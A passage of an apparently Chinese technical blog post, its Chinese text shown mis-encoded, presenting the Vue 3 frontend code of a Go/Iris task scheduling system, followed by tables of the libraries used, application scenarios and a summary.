            <span class="hljs-keyword">const</span> <span class="hljs-title function_">editTask</span> = (<span class="hljs-params">task</span>) =&gt; {
                editingTask.<span class="hljs-property">value</span> = { ...task };
                <span class="hljs-comment">// è½¬æ¢æ—¥æœŸæ ¼å¼</span>
                <span class="hljs-keyword">if</span> (editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">type</span> === <span class="hljs-string">'single'</span>) {
                    editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span>).<span class="hljs-title function_">toISOString</span>().<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>);
                }
                showEditTaskModal.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
            };

            <span class="hljs-comment">// æ›´æ–°ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateTask</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// è½¬æ¢æ—¥æœŸæ ¼å¼</span>
                    <span class="hljs-keyword">if</span> (editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">type</span> === <span class="hljs-string">'single'</span>) {
                        editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(editingTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span>).<span class="hljs-title function_">toISOString</span>();
                    }

                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">put</span>(<span class="hljs-string">`/api/tasks/<span class="hljs-subst">${editingTask.value.id}</span>`</span>, editingTask.<span class="hljs-property">value</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡æ›´æ–°æˆåŠŸ'</span>, <span class="hljs-string">'success'</span>);
                        showEditTaskModal.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
                        <span class="hljs-title function_">loadTasks</span>();
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡æ›´æ–°å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡æ›´æ–°å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ›´æ–°ä»»åŠ¡å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åˆ é™¤ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">deleteTask</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id</span>) =&gt; {
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_">confirm</span>(<span class="hljs-string">'ç¡®å®šè¦åˆ é™¤è¿™ä¸ªä»»åŠ¡å—ï¼Ÿ'</span>)) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">delete</span>(<span class="hljs-string">`/api/tasks/<span class="hljs-subst">${id}</span>`</span>);
                        <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                            <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ é™¤æˆåŠŸ'</span>, <span class="hljs-string">'success'</span>);
                            <span class="hljs-title function_">loadTasks</span>();
                        } <span class="hljs-keyword">else</span> {
                            <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ é™¤å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                        }
                    } <span class="hljs-keyword">catch</span> (error) {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ é™¤å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åˆ é™¤ä»»åŠ¡å¤±è´¥:'</span>, error);
                    }
                }
            };

            <span class="hljs-comment">// åˆ‡æ¢ä»»åŠ¡çŠ¶æ€</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTaskStatus</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id, enabled</span>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> action = enabled ? <span class="hljs-string">'stop'</span> : <span class="hljs-string">'start'</span>;
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`/api/tasks/<span class="hljs-subst">${id}</span>/<span class="hljs-subst">${action}</span>`</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${enabled ? <span class="hljs-string">'ç»ˆæ­¢'</span> : <span class="hljs-string">'å¯åŠ¨'</span>}</span>æˆåŠŸ`</span>, <span class="hljs-string">'success'</span>);
                        <span class="hljs-title function_">loadTasks</span>();
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${enabled ? <span class="hljs-string">'ç»ˆæ­¢'</span> : <span class="hljs-string">'å¯åŠ¨'</span>}</span>å¤±è´¥`</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${enabled ? <span class="hljs-string">'ç»ˆæ­¢'</span> : <span class="hljs-string">'å¯åŠ¨'</span>}</span>å¤±è´¥`</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`<span class="hljs-subst">${enabled ? <span class="hljs-string">'ç»ˆæ­¢'</span> : <span class="hljs-string">'å¯åŠ¨'</span>}</span>ä»»åŠ¡å¤±è´¥:`</span>, error);
                }
            };

            <span class="hljs-comment">// åˆ‡æ¢ä»»åŠ¡æš‚åœçŠ¶æ€</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTaskPause</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id, paused</span>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> action = paused ? <span class="hljs-string">'resume'</span> : <span class="hljs-string">'pause'</span>;
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`/api/tasks/<span class="hljs-subst">${id}</span>/<span class="hljs-subst">${action}</span>`</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${paused ? <span class="hljs-string">'ç»§ç»­'</span> : <span class="hljs-string">'æš‚åœ'</span>}</span>æˆåŠŸ`</span>, <span class="hljs-string">'success'</span>);
                        <span class="hljs-title function_">loadTasks</span>();
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${paused ? <span class="hljs-string">'ç»§ç»­'</span> : <span class="hljs-string">'æš‚åœ'</span>}</span>å¤±è´¥`</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">`ä»»åŠ¡<span class="hljs-subst">${paused ? <span class="hljs-string">'ç»§ç»­'</span> : <span class="hljs-string">'æš‚åœ'</span>}</span>å¤±è´¥`</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`<span class="hljs-subst">${paused ? <span class="hljs-string">'ç»§ç»­'</span> : <span class="hljs-string">'æš‚åœ'</span>}</span>ä»»åŠ¡å¤±è´¥:`</span>, error);
                }
            };

            <span class="hljs-comment">// æŸ¥çœ‹ä»»åŠ¡æ—¥å¿—</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">showTaskLogs</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id</span>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/api/tasks/logs?task_id=<span class="hljs-subst">${id}</span>`</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        taskLogs.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">logs</span>;
                        taskName.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">taskName</span> || <span class="hljs-string">''</span>;
                        taskFuncName.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">taskFuncName</span> || <span class="hljs-string">''</span>;
                        taskFuncDesc.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">taskFuncDesc</span> || <span class="hljs-string">''</span>;
                        showLogsModal.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡æ—¥å¿—å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡æ—¥å¿—å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡æ—¥å¿—å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// é€‰æ‹©Cronæ¨¡æ¿</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">selectCronTemplate</span> = (<span class="hljs-params">value</span>) =&gt; {
                <span class="hljs-keyword">if</span> (value) {
                    newTask.<span class="hljs-property">value</span>.<span class="hljs-property">cron_expr</span> = value;
                }
            };

            <span class="hljs-comment">// å¤„ç†ä»»åŠ¡å‡½æ•°å˜æ›´</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTaskFuncChange</span> = (<span class="hljs-params">funcName</span>) =&gt; {
                <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ ä»»åŠ¡å‡½æ•°å˜æ›´çš„å¤„ç†é€»è¾‘</span>
            };

            <span class="hljs-comment">// æ’åºä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">sortTasks</span> = (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-comment">// å®ç°ä»»åŠ¡æ’åºé€»è¾‘</span>
            };

            <span class="hljs-comment">// æ ¼å¼åŒ–æ—¥æœŸæ—¶é—´</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">formatDateTime</span> = (<span class="hljs-params">dateTime</span>) =&gt; {
                <span class="hljs-keyword">if</span> (!dateTime) <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;
                <span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(dateTime);
                <span class="hljs-keyword">return</span> date.<span class="hljs-title function_">toLocaleString</span>(<span class="hljs-string">'zh-CN'</span>, {
                    <span class="hljs-attr">year</span>: <span class="hljs-string">'numeric'</span>,
                    <span class="hljs-attr">month</span>: <span class="hljs-string">'2-digit'</span>,
                    <span class="hljs-attr">day</span>: <span class="hljs-string">'2-digit'</span>,
                    <span class="hljs-attr">hour</span>: <span class="hljs-string">'2-digit'</span>,
                    <span class="hljs-attr">minute</span>: <span class="hljs-string">'2-digit'</span>,
                    <span class="hljs-attr">second</span>: <span class="hljs-string">'2-digit'</span>
                });
            };

            <span class="hljs-comment">// è·å–Croné—´éš”æè¿°</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">getCronInterval</span> = (<span class="hljs-params">cronExpr</span>) =&gt; {
                <span class="hljs-keyword">if</span> (!cronExpr) <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>;
                
                <span class="hljs-comment">// ç®€å•çš„Cronè¡¨è¾¾å¼è§£æ</span>
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'*/10 * * * * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯10ç§’'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 * * * * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯åˆ†é’Ÿ'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 */5 * * * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯5åˆ†é’Ÿ'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 0 * * * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯å°æ—¶'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 0 0 * * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯å¤©'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 0 0 * * 0'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯å‘¨'</span>;
                <span class="hljs-keyword">if</span> (cronExpr === <span class="hljs-string">'0 0 0 1 * *'</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'æ¯æœˆ'</span>;
                
                <span class="hljs-keyword">return</span> cronExpr;
            };

            <span class="hljs-comment">// è®¡ç®—åˆ†é¡µæ˜¾ç¤ºçš„é¡µç </span>
            <span class="hljs-keyword">const</span> tasksDisplayedPages = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> totalPages = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(tasksTotal.<span class="hljs-property">value</span> / tasksPageSize.<span class="hljs-property">value</span>);
                <span class="hljs-keyword">const</span> pages = [];
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= totalPages; i++) {
                    pages.<span class="hljs-title function_">push</span>(i);
                }
                <span class="hljs-keyword">return</span> pages;
            });

            <span class="hljs-keyword">const</span> cronDisplayedPages = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> totalPages = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(cronTotal.<span class="hljs-property">value</span> / cronPageSize.<span class="hljs-property">value</span>);
                <span class="hljs-keyword">const</span> pages = [];
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= totalPages; i++) {
                    pages.<span class="hljs-title function_">push</span>(i);
                }
                <span class="hljs-keyword">return</span> pages;
            });

            <span class="hljs-comment">// è®¡ç®—åˆ†é¡µåçš„ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> paginatedTasks = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> start = (tasksPage.<span class="hljs-property">value</span> - <span class="hljs-number">1</span>) * tasksPageSize.<span class="hljs-property">value</span>;
                <span class="hljs-keyword">const</span> end = start + tasksPageSize.<span class="hljs-property">value</span>;
                <span class="hljs-keyword">return</span> tasks.<span class="hljs-property">value</span>.<span class="hljs-title function_">slice</span>(start, end);
            });

            <span class="hljs-keyword">const</span> paginatedCronExpressions = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> start = (cronPage.<span class="hljs-property">value</span> - <span class="hljs-number">1</span>) * cronPageSize.<span class="hljs-property">value</span>;
                <span class="hljs-keyword">const</span> end = start + cronPageSize.<span class="hljs-property">value</span>;
                <span class="hljs-keyword">return</span> cronExpressions.<span class="hljs-property">value</span>.<span class="hljs-title function_">slice</span>(start, end);
            });

            <span class="hljs-comment">// åˆå§‹åŒ–å›¾è¡¨</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">initCharts</span> = (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-comment">// å®ç°å›¾è¡¨åˆå§‹åŒ–é€»è¾‘</span>
            };

            <span class="hljs-comment">// æ˜¾ç¤ºæç¤º</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">showToast</span> = (<span class="hljs-params">message, type = <span class="hljs-string">'info'</span></span>) =&gt; {
                <span class="hljs-comment">// å®ç°æç¤ºåŠŸèƒ½</span>
            };

            <span class="hljs-comment">// ç”Ÿå‘½å‘¨æœŸé’©å­</span>
            <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-title function_">loadTasks</span>();
                <span class="hljs-title function_">loadAllTaskLogs</span>();
                <span class="hljs-title function_">loadTaskFuncs</span>();
                <span class="hljs-title function_">loadCronExpressions</span>();
            });

            <span class="hljs-title function_">watch</span>(activeTab, <span class="hljs-function">(<span class="hljs-params">newTab</span>) =&gt;</span> {
                <span class="hljs-keyword">if</span> (newTab === <span class="hljs-string">'statistics'</span>) {
                    <span class="hljs-title function_">loadStatistics</span>();
                    <span class="hljs-title function_">loadFailedTasks</span>();
                    <span class="hljs-title function_">loadFrequentTasks</span>();
                }
            });

            <span class="hljs-keyword">return</span> {
                <span class="hljs-comment">// çŠ¶æ€</span>
                activeTab,
                tasks,
                taskLogs,
                allTaskLogs,
                taskFuncs,
                statistics,
                failedTasks,
                frequentTasks,
                cronExpressions,
                tasksPage,
                tasksPageSize,
                tasksTotal,
                cronPage,
                cronPageSize,
                cronTotal,
                sortBy,
                sortOrder,
                showAddTaskModal,
                showEditTaskModal,
                showLogsModal,
                showCronModal,
                newTask,
                editingTask,
                editingCron,
                taskName,
                taskFuncName,
                taskFuncDesc,
                commonCronExpressions,
                
                <span class="hljs-comment">// æ–¹æ³•</span>
                loadTasks,
                addTask,
                editTask,
                updateTask,
                deleteTask,
                toggleTaskStatus,
                toggleTaskPause,
                showTaskLogs,
                selectCronTemplate,
                handleTaskFuncChange,
                sortTasks,
                formatDateTime,
                getCronInterval,
                tasksDisplayedPages,
                cronDisplayedPages,
                paginatedTasks,
                paginatedCronExpressions
            };
        }
    }).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-34">ä¸ƒã€é¡¹ç›®åº”ç”¨çš„ç¬¬ä¸‰æ–¹åŒ…ä»‹ç»</h3>
<h4 data-id="heading-35">1. åç«¯ç¬¬ä¸‰æ–¹åŒ…</h4>



































<table><thead><tr><th>åŒ…å</th><th>ç‰ˆæœ¬</th><th>ç”¨é€”</th><th>æ¥æº</th></tr></thead><tbody><tr><td><code>github.com/kataras/iris/v12</code></td><td>12.2.11</td><td>Webæ¡†æ¶</td><td>go.mod</td></tr><tr><td><code>go.uber.org/zap</code></td><td>1.24.0</td><td>æ—¥å¿—åº“</td><td>go.mod</td></tr><tr><td><code>xorm.io/xorm</code></td><td>1.3.6</td><td>ORMæ¡†æ¶</td><td>go.mod</td></tr><tr><td><code>github.com/robfig/cron/v3</code></td><td>3.0.1</td><td>Cronè¡¨è¾¾å¼è§£æ</td><td>go.mod</td></tr></tbody></table>
<h4 data-id="heading-36">2. å‰ç«¯ç¬¬ä¸‰æ–¹åº“</h4>





























<table><thead><tr><th>åº“å</th><th>ç‰ˆæœ¬</th><th>ç”¨é€”</th><th>æ¥æº</th></tr></thead><tbody><tr><td>Vue.js</td><td>3.x</td><td>å‰ç«¯æ¡†æ¶</td><td>static/js/vue.global.js</td></tr><tr><td>Axios</td><td>0.27.2</td><td>HTTPå®¢æˆ·ç«¯</td><td>static/js/axios.min.js</td></tr><tr><td>ECharts</td><td>5.4.0</td><td>å›¾è¡¨åº“</td><td>static/js/echarts.min.js</td></tr></tbody></table>
<h3 data-id="heading-37">å…«ã€é¡¹ç›®åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-38">1. ç³»ç»Ÿè‡ªåŠ¨åŒ–è¿ç»´</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šå®šæœŸæ‰§è¡Œç³»ç»Ÿç»´æŠ¤ä»»åŠ¡ï¼Œå¦‚æ—¥å¿—æ¸…ç†ã€æ•°æ®åº“å¤‡ä»½ã€ç³»ç»Ÿæ›´æ–°ç­‰ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨åŒ–æ‰§è¡Œï¼Œå‡å°‘äººå·¥å¹²é¢„</li>
<li>å®šæ—¶æ‰§è¡Œï¼Œç¡®ä¿ä»»åŠ¡åœ¨åˆé€‚çš„æ—¶é—´ç‚¹è¿è¡Œ</li>
<li>æ‰§è¡Œç»“æœå¯è¿½è¸ªï¼Œä¾¿äºé—®é¢˜æ’æŸ¥</li>
</ul>
<h4 data-id="heading-39">2. æ•°æ®å¤„ç†ä¸åˆ†æ</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šå®šæœŸå¤„ç†å’Œåˆ†æä¸šåŠ¡æ•°æ®ï¼Œå¦‚é”€å”®æ•°æ®æ±‡æ€»ã€ç”¨æˆ·è¡Œä¸ºåˆ†æã€æŠ¥è¡¨ç”Ÿæˆç­‰ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>å‘¨æœŸæ€§æ‰§è¡Œï¼Œç¡®ä¿æ•°æ®åŠæ—¶æ›´æ–°</li>
<li>å¯è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé¿å…ä»»åŠ¡æ‰§è¡Œè¿‡é•¿å½±å“ç³»ç»Ÿæ€§èƒ½</li>
<li>æ‰§è¡Œç»“æœå¯è®°å½•ï¼Œä¾¿äºæ•°æ®è¿½æº¯</li>
</ul>
<h4 data-id="heading-40">3. å¤–éƒ¨ç³»ç»Ÿé›†æˆ</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šä¸å¤–éƒ¨ç³»ç»Ÿè¿›è¡Œæ•°æ®åŒæ­¥ï¼Œå¦‚APIè°ƒç”¨ã€æ•°æ®é‡‡é›†ã€æ¶ˆæ¯æ¨é€ç­‰ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>å¯è®¾ç½®æ‰§è¡Œé—´éš”ï¼Œæ§åˆ¶APIè°ƒç”¨é¢‘ç‡</li>
<li>æ‰§è¡Œå¤±è´¥å¯è®°å½•ï¼Œä¾¿äºé—®é¢˜æ’æŸ¥</li>
<li>å¯æš‚åœå’Œç»§ç»­ä»»åŠ¡ï¼Œçµæ´»æ§åˆ¶é›†æˆè¿‡ç¨‹</li>
</ul>
<h4 data-id="heading-41">4. å®šæ—¶ä»»åŠ¡è°ƒåº¦</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šæ‰§è¡Œå„ç§å®šæ—¶ä»»åŠ¡ï¼Œå¦‚é‚®ä»¶å‘é€ã€çŸ­ä¿¡æé†’ã€ç³»ç»Ÿé€šçŸ¥ç­‰ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>æ”¯æŒä¸€æ¬¡æ€§å’Œå‘¨æœŸæ€§ä»»åŠ¡</li>
<li>å¯è®¾ç½®æ‰§è¡Œæ—¶é—´ï¼Œç¡®ä¿ä»»åŠ¡åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œ</li>
<li>è¶…æœŸä»»åŠ¡è‡ªåŠ¨å¤„ç†ï¼Œé¿å…ä»»åŠ¡å †ç§¯</li>
</ul>
<h4 data-id="heading-42">5. é«˜é¢‘ä»»åŠ¡ç›‘æ§</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šç›‘æ§é«˜é¢‘æ‰§è¡Œçš„ä»»åŠ¡ï¼Œå¦‚å®æ—¶æ•°æ®é‡‡é›†ã€çŠ¶æ€æ£€æŸ¥ç­‰ã€‚</p>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>å¯è¯†åˆ«é«˜é¢‘ä»»åŠ¡ï¼Œä¾¿äºèµ„æºè§„åˆ’</li>
<li>æ‰§è¡Œæ¬¡æ•°ç»Ÿè®¡ï¼Œä¾¿äºä»»åŠ¡è¯„ä¼°</li>
<li>æ‰§è¡ŒçŠ¶æ€ç›‘æ§ï¼Œç¡®ä¿ä»»åŠ¡æ­£å¸¸è¿è¡Œ</li>
</ul>
<h3 data-id="heading-43">æ€»ç»“</h3>
<p>æœ¬ä»»åŠ¡è°ƒåº¦ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œæ•´ã€æ¶æ„æ¸…æ™°çš„Goè¯­è¨€é¡¹ç›®ï¼Œé‡‡ç”¨å‰åç«¯åˆ†ç¦»æ¶æ„ï¼Œåç«¯ä½¿ç”¨Goè¯­è¨€çš„Irisæ¡†æ¶ï¼Œå‰ç«¯ä½¿ç”¨Vue3+HTML5å®ç°ã€‚ç³»ç»Ÿæ”¯æŒä»»åŠ¡çš„åˆ›å»ºã€ç¼–è¾‘ã€åˆ é™¤ã€å¯åŠ¨/ç»ˆæ­¢ã€æš‚åœ/ç»§ç»­ç­‰åŸºæœ¬æ“ä½œï¼Œæ”¯æŒä¸€æ¬¡æ€§ä»»åŠ¡å’Œå‘¨æœŸæ€§ä»»åŠ¡ä¸¤ç§ç±»å‹ï¼Œå…·æœ‰ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€å®æ—¶ç›‘æ§ã€æ‰§è¡Œç»“æœè®°å½•ä¸å±•ç¤ºã€è¶…æœŸä»»åŠ¡è‡ªåŠ¨å¤„ç†ã€ä»»åŠ¡æ‰§è¡Œç»Ÿè®¡åˆ†æç­‰åŠŸèƒ½ã€‚</p>
<p>é¡¹ç›®ä»£ç ç»„ç»‡åˆç†ï¼Œæ ¸å¿ƒåŠŸèƒ½å®ç°å®Œå–„ï¼Œå…·æœ‰è‰¯å¥½çš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œå¯åº”ç”¨äºå„ç§éœ€è¦è‡ªåŠ¨åŒ–ä»»åŠ¡è°ƒåº¦çš„åœºæ™¯ã€‚é€šè¿‡æœ¬é¡¹ç›®çš„å¼€å‘ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨Goè¯­è¨€æ„å»ºä¸€ä¸ªå®Œæ•´çš„ä»»åŠ¡è°ƒåº¦ç³»ç»Ÿï¼ŒåŒ…æ‹¬åç«¯APIå¼€å‘ã€å‰ç«¯ç•Œé¢å®ç°ã€æ•°æ®åº“æ“ä½œã€ä»»åŠ¡è°ƒåº¦å’Œæ‰§è¡Œç­‰å„ä¸ªæ–¹é¢ã€‚</p>
<p>è¯¥ç³»ç»Ÿä¸ä»…æ»¡è¶³äº†åŸºæœ¬çš„ä»»åŠ¡è°ƒåº¦éœ€æ±‚ï¼Œè¿˜æä¾›äº†ä¸°å¯Œçš„ç»Ÿè®¡åˆ†æåŠŸèƒ½ï¼Œå¸®åŠ©ç”¨æˆ·æ›´å¥½åœ°äº†è§£ä»»åŠ¡æ‰§è¡Œæƒ…å†µï¼Œä¼˜åŒ–ä»»åŠ¡é…ç½®å’Œèµ„æºåˆ†é…ã€‚åŒæ—¶ï¼Œç³»ç»Ÿçš„è¶…æœŸä»»åŠ¡è‡ªåŠ¨å¤„ç†åŠŸèƒ½ç¡®ä¿äº†ä»»åŠ¡çš„åŠæ—¶æ¸…ç†ï¼Œé¿å…äº†ä»»åŠ¡å †ç§¯å’Œèµ„æºæµªè´¹ã€‚</p>
